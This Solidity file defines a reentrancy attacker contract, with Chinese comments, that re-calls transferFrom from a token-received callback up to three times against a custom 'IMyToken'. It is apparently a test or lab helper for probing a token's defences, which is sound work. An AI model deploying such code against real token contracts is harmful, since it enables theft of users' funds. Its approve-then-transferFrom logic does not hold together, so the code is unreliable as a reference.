// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IMyToken {
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract ReentrancyAttackContract {
    IMyToken public token;
    address public owner;
    uint256 public attackCount;

    constructor(address _tokenAddress) {
        token = IMyToken(_tokenAddress);
        owner = msg.sender;
    }

    // 开始攻击
    function startAttack(uint256 amount) external {
        require(msg.sender == owner, "Only owner can attack");

        // 首先获得目标账户的授权
        token.approve(address(this), amount);

        // 调用 transferFrom 发起第一次攻击
        token.transferFrom(owner, address(this), amount);
    }

    // 接受代币时再次调用 transferFrom 进行重入攻击
    function onTokenReceived(address from, uint256 amount) external {
        if (attackCount < 3) {
            // 控制攻击次数，避免耗尽 Gas
            attackCount++;
            token.transferFrom(from, address(this), amount);
        }
    }
}
